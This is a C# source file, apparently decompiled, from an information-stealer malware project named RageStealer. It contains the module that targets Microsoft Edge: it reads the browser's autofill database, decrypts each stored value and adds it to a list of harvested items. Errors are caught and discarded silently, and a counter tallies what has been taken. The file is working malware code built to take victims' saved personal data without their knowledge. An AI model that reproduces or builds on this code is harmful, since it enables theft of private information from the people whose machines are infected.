using System;
using System.Collections.Generic;
using RageStealer.Helper;
using RageStealer.Helpers;
using RageStealer.Target.Browsers.Chromium;

namespace RageStealer.Target.Browsers.Edge;

internal sealed class Autofill
{
	public static List<AutoFill> Get(string sWebData)
	{
		List<AutoFill> list = new List<AutoFill>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(sWebData, "autofill");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				AutoFill autoFill = default(AutoFill);
				autoFill.Name = RageStealer.Target.Browsers.Chromium.Crypto.GetUtf8(sqLite.GetValue(i, 1));
				autoFill.Value = RageStealer.Target.Browsers.Chromium.Crypto.GetUtf8(RageStealer.Target.Browsers.Chromium.Crypto.EasyDecrypt(sWebData, sqLite.GetValue(i, 2)));
				AutoFill item = autoFill;
				list.Add(item);
				Counter.AutoFill++;
			}
		}
		catch (Exception)
		{
		}
		return list;
	}
}
